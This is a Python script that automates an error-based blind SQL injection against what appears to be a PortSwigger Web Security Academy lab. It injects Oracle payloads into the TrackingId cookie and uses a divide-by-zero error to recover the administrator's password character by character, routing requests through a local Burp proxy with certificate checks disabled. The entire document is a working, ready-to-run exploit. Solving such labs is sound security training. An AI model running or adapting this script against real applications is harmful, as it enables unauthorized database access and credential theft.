import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


URL = "https://0ae50015048f0d2a80bf170e008500aa.web-security-academy.net/"
TRACKING_ID = "KwsIHlAorxU5Zanz"
SESSION = "138IxRwQGDSrgdsgNYHOM8cnz7qhtMzh"


PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():

    print("[*] Performing sanity check...")
    test_payload = f"{TRACKING_ID}'||(SELECT TO_CHAR(1/0) FROM dual)||'"
    r = requests.get(URL, cookies={'TrackingId': test_payload, 'session': SESSION}, verify=False, proxies=PROXIES)
    
    if r.status_code != 500:
        print("[!] ERROR: The injection didn't trigger a 500 error.")
        print("Check if your TrackingId/Session expired or if Burp is blocking the request.")
        return
    print("[+] Sanity check passed (500 received). Starting extraction...")


    password_extracted = ""

    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    

    for i in range(1, 21):
        found_char_at_pos = False
        print(f"\n[*] Testing Position {i}: ", end="", flush=True)
        
        for char in alphabet:

            payload = f"{TRACKING_ID}'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            
            cookies = {
                'TrackingId': payload,
                'session': SESSION
            }
            
            try:
                r = requests.get(URL, cookies=cookies, verify=False, proxies=PROXIES)
     
                if r.status_code == 500:
                    password_extracted += char
                    print(f"FOUND -> {char}")
                    found_char_at_pos = True
                    break
                else:
                   
                   
                    print(".", end="", flush=True)
            
            except Exception as e:
                print(f"\n[!] Connection error: {e}")
                return

        if not found_char_at_pos:
            print("\n[!] Could not find character at this position. Ending search.")
            break

    print(f"\n\n[SUCCESS] Final Administrator Password: {password_extracted}")

if __name__ == "__main__":
    main()